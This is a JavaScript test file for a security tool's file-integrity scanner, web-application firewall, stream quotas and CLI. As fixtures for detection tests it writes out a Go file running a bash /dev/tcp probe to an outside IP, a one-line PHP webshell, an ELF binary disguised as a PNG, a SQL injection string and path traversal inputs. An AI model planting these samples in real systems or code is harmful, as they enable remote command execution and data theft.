import test, { after } from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import { execFileSync } from 'node:child_process';
import {
	closeSync,
	existsSync,
	ftruncateSync,
	mkdirSync,
	mkdtempSync,
	openSync,
	rmSync,
	symlinkSync,
	unlinkSync,
	writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { registerTsAliasHooks } from '../../scripts/ts-loader.mjs';
import { teardownContractTestResources } from './helper.mjs';

registerTsAliasHooks();
after(teardownContractTestResources);

test('security: FIM resolveTargetDir rejects traversal and symlink escapes', async () => {
	const { resolveTargetDir } = await import('../../src/db/repositories/inspection/targets.ts');

	assert.throws(() => resolveTargetDir('../etc'), /traversal/i);
	assert.throws(() => resolveTargetDir('/etc/passwd'), /outside/i);

	const sandbox = mkdtempSync(join(tmpdir(), 'orbit-fim-symlink-'));
	const escapeLink = join(sandbox, 'escape');
	try {
		symlinkSync('/etc', escapeLink);
		assert.throws(() => resolveTargetDir(escapeLink), /outside/i);
	} finally {
		rmSync(sandbox, { recursive: true, force: true });
	}
});

test('security: FIM streaming scanner handles Go/JSON parity, exclusions, anomalies, 35MB sparse OOM cap, and uploads malware', async () => {
	const { SCANNABLE_EXTENSIONS } = await import('../../src/db/repositories/inspection/heuristicRules.ts');
	const { runPureNodeFimScan } = await import('../../src/db/repositories/inspection/pureScanner.ts');

	assert.ok(SCANNABLE_EXTENSIONS.has('.go'), 'SCANNABLE_EXTENSIONS must include .go');
	assert.ok(SCANNABLE_EXTENSIONS.has('.json'), 'SCANNABLE_EXTENSIONS must include .json');

	const workDir = mkdtempSync(join(tmpdir(), 'orbit-fim-scan-'));
	const baselinePath = join(workDir, 'baseline-repo.json');

	try {
		mkdirSync(join(workDir, 'nested'), { recursive: true });
		mkdirSync(join(workDir, '.git'), { recursive: true });
		writeFileSync(join(workDir, 'nested', 'config.json'), '{"ok":true}\n', 'utf-8');
		writeFileSync(join(workDir, 'main.go'), 'package main\nfunc main() {}\n', 'utf-8');
		writeFileSync(join(workDir, '.git', 'secret.ts'), 'eval("x")', 'utf-8');

		// 35 MB sparse file must be safely skipped before buffer allocation
		const sparsePath = join(workDir, 'huge.json');
		const fd = openSync(sparsePath, 'w');
		try {
			ftruncateSync(fd, 35 * 1024 * 1024);
		} finally {
			closeSync(fd);
		}

		const first = await runPureNodeFimScan(workDir, baselinePath, true, 'repo');
		assert.strictEqual(first.targetKey, 'repo');
		assert.strictEqual(first.baselineSaved, true);
		assert.strictEqual(first.scannedFiles, 2);
		assert.strictEqual(first.suspiciousFiles.length, 0);
		assert.strictEqual(first.anomalies.length, 0);

		// Verify POSIX relative keys in saved baseline and exclusion of baseline-*.json & .git
		writeFileSync(join(workDir, 'nested', 'config.json'), '{"ok":false}\n', 'utf-8');
		unlinkSync(join(workDir, 'main.go'));
		writeFileSync(
			join(workDir, 'backdoor.go'),
			'package main\nimport "os/exec"\nfunc p() { _ = exec.Command("bash", "-c", "cat /dev/tcp/1.1.1.1/4444") }\n',
			'utf-8'
		);

		const second = await runPureNodeFimScan(workDir, baselinePath, false, 'repo');
		const typesByPath = new Map(second.anomalies.map((a) => [a.path, a.type]));
		assert.strictEqual(typesByPath.get('nested/config.json'), 'modified');
		assert.strictEqual(typesByPath.get('main.go'), 'deleted');
		assert.strictEqual(typesByPath.get('backdoor.go'), 'added');
		assert.ok(second.suspiciousFiles.some((f) => f.path === 'backdoor.go'), 'Expected malicious Go probe to trigger alert');

		// Uploads profile detects disguised ELF binaries and PHP webshells
		const uploadDir = mkdtempSync(join(tmpdir(), 'orbit-fim-upload-'));
		const uploadBaseline = join(tmpdir(), `orbit-upload-base-${process.pid}.json`);
		try {
			writeFileSync(join(uploadDir, 'avatar.png'), Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01]));
			writeFileSync(join(uploadDir, 'shell.php'), '<?php eval($_POST["cmd"]); ?>', 'utf-8');

			const uploadRes = await runPureNodeFimScan(uploadDir, uploadBaseline, false, 'uploads');
			assert.strictEqual(uploadRes.scannedFiles, 2);
			const flagged = new Set(uploadRes.suspiciousFiles.map((s) => s.path));
			assert.ok(flagged.has('avatar.png'), 'Disguised ELF binary in uploads must be flagged');
			assert.ok(flagged.has('shell.php'), 'PHP webshell in uploads must be flagged');
		} finally {
			rmSync(uploadDir, { recursive: true, force: true });
			rmSync(uploadBaseline, { force: true });
		}
	} finally {
		rmSync(workDir, { recursive: true, force: true });
	}
});

test('runtime: typed SSE protocol encoding and per-user/global stream quota eviction', async () => {
	const {
		SYSTEM_SSE_EVENTS,
		encodeSseComment,
		encodeSseEvent,
		isSystemSseEventName,
		parseSseJson,
	} = await import('../../src/lib/sse/protocol.ts');
	const { acquireStreamSlot, getStreamQuotaSnapshot } = await import('../../src/server/sse/streamQuota.ts');

	assert.ok(SYSTEM_SSE_EVENTS.includes('soc_updated'));
	assert.strictEqual(isSystemSseEventName('soc_updated'), true);
	assert.strictEqual(isSystemSseEventName('unknown_event'), false);

	const frameText = new TextDecoder().decode(encodeSseEvent('soc_updated', { ts: 42 }));
	assert.match(frameText, /^event: soc_updated\ndata: \{"ts":42\}\n\n$/);
	assert.strictEqual(new TextDecoder().decode(encodeSseComment('heartbeat')), ': heartbeat\n\n');
	assert.deepStrictEqual(parseSseJson('{"id":7}'), { id: 7 });
	assert.strictEqual(parseSseJson('{broken'), null);

	let evicted = 0;
	const releases = [];
	for (let i = 0; i < 4; i++) {
		const slot = acquireStreamSlot({
			channel: 'soc',
			userId: 'quota-user-1',
			maxPerUser: 2,
			maxGlobal: 4,
			onEvict: () => {
				evicted += 1;
			},
		});
		assert.strictEqual(slot.ok, true);
		if (slot.ok) releases.push(slot.release);
	}
	assert.strictEqual(evicted, 2, 'Opening 4 slots with maxPerUser=2 must evict oldest 2 streams');
	assert.strictEqual(getStreamQuotaSnapshot().soc, 2);

	const otherA = acquireStreamSlot({ channel: 'soc', userId: 'u-a', maxPerUser: 2, maxGlobal: 4, onEvict: () => {} });
	const otherB = acquireStreamSlot({ channel: 'soc', userId: 'u-b', maxPerUser: 2, maxGlobal: 4, onEvict: () => {} });
	const overflow = acquireStreamSlot({ channel: 'soc', userId: 'u-c', maxPerUser: 2, maxGlobal: 4, onEvict: () => {} });
	assert.strictEqual(overflow.ok, false);
	if (!overflow.ok) assert.ok(overflow.retryAfter > 0);

	if (otherA.ok) otherA.release();
	if (otherB.ok) otherB.release();
	for (const rel of releases) rel();
	assert.strictEqual(getStreamQuotaSnapshot().soc, 0);
});

test('ipc: securityGuardClient communicates over Linux Unix domain socket and cleanly resets', async () => {
	const sockPath = join(tmpdir(), `orbit-guard-test-${process.pid}-${Date.now()}.sock`);
	const prevSocket = process.env.ORBIT_GUARD_SOCKET;
	process.env.ORBIT_GUARD_SOCKET = sockPath;

	const server = http.createServer((req, res) => {
		const chunks = [];
		req.on('data', (c) => chunks.push(c));
		req.on('end', () => {
			res.setHeader('Content-Type', 'application/json');
			if (req.url === '/health') {
				res.end(JSON.stringify({ status: 'ok', service: 'security-guard', uptime: 1.5 }));
				return;
			}
			if (req.url === '/api/waf/inspect') {
				const parsed = JSON.parse(Buffer.concat(chunks).toString('utf-8') || '{}');
				res.end(JSON.stringify({
					matched: String(parsed.search || '').includes('union'),
					category: 'sqli',
					points: 90,
					signature: 'unix-ipc-waf',
				}));
				return;
			}
			if (req.url === '/api/fim/scan') {
				res.end(JSON.stringify({ targetKey: 'uploads', scannedFiles: 0, anomalies: [] }));
				return;
			}
			res.statusCode = 404;
			res.end(JSON.stringify({ error: 'not found' }));
		});
	});

	await new Promise((resolveListen) => server.listen(sockPath, resolveListen));

	const guardClient = await import('../../src/server/security/securityGuardClient.ts');
	try {
		assert.strictEqual(guardClient.resolveGuardSocketPath(), sockPath);

		const health = await guardClient.checkSecurityGuardHealth();
		assert.strictEqual(health.available, true);
		assert.strictEqual(health.transport, 'unix');

		const waf = await guardClient.inspectWafWithGuard({ pathname: '/api/members', search: '?q=union' });
		assert.strictEqual(waf?.matched, true);
		assert.strictEqual(waf?.signature, 'unix-ipc-waf');

		const fim = await guardClient.runFimScanWithGuard('uploads', false);
		assert.strictEqual(fim?.targetKey, 'uploads');
		assert.strictEqual(guardClient.getSecurityGuardTransportInfo().transport, 'unix');
	} finally {
		guardClient.resetSecurityGuardClientState();
		server.closeAllConnections?.();
		await new Promise((resolveClose) => server.close(() => resolveClose()));
		if (existsSync(sockPath)) unlinkSync(sockPath);
		if (prevSocket === undefined) delete process.env.ORBIT_GUARD_SOCKET;
		else process.env.ORBIT_GUARD_SOCKET = prevSocket;
		assert.strictEqual(guardClient.resolveGuardSocketPath() === sockPath, false);
	}
});

test('cli: bin/orbit executes status, waf inspection, and microbenchmarks cleanly', () => {
	const statusOut = execFileSync(process.execPath, ['scripts/orbit-cli.mjs', 'status', '--json'], {
		encoding: 'utf-8',
	});
	const statusJson = JSON.parse(statusOut);
	assert.strictEqual(statusJson.ok, true);
	assert.strictEqual(typeof statusJson.node, 'string');
	assert.ok(statusJson.securityGuard && typeof statusJson.securityGuard.transport === 'string');
	assert.ok(Array.isArray(statusJson.fimBaselines) && statusJson.fimBaselines.length >= 4);

	const wafOut = execFileSync(
		process.execPath,
		['scripts/orbit-cli.mjs', 'waf', '/api/users?id=1 UNION SELECT password FROM users', '--json'],
		{ encoding: 'utf-8' }
	);
	const wafJson = JSON.parse(wafOut);
	assert.strictEqual(wafJson.ok, true);
	assert.strictEqual(wafJson.input.pathname, '/api/users');
	assert.strictEqual(wafJson.local.matched, true);

	const benchOut = execFileSync(
		process.execPath,
		['scripts/orbit-cli.mjs', 'bench', '--iterations', '15', '--json'],
		{ encoding: 'utf-8' }
	);
	const benchJson = JSON.parse(benchOut);
	assert.strictEqual(benchJson.ok, true);
	assert.strictEqual(benchJson.iterations, 15);
	assert.strictEqual(typeof benchJson.wafInspectionUs?.p50, 'number');
	assert.strictEqual(typeof benchJson.wasmSecurityUs?.p50, 'number');
});
